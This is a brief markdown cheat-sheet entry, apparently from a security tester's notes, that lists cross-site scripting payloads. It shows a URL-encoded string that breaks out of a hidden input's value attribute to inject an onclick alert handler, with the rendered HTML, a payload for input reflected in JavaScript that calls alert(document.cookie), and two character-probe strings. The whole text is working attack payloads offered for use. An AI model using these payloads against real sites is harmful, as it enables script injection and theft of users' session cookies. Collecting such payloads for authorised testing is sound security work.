#### New payload I have recently been seeing

```
xxx.com%2fexqxn%22accesskey%3d%22x%22onclick%3d%22alert(1)%22%2f%2flz241 HTTP/1.1
```
Which becomes
```
[...]<input type="hidden" name="target" value="https://xxx.com/exqxn "accesskey="x"onclick="alert (1)"//lz241">
```

#### RXSS in JS
When input reflected in JS, try:
`a'-alert(document.cookie)-'b`



//\'`-<>!"

//\'!
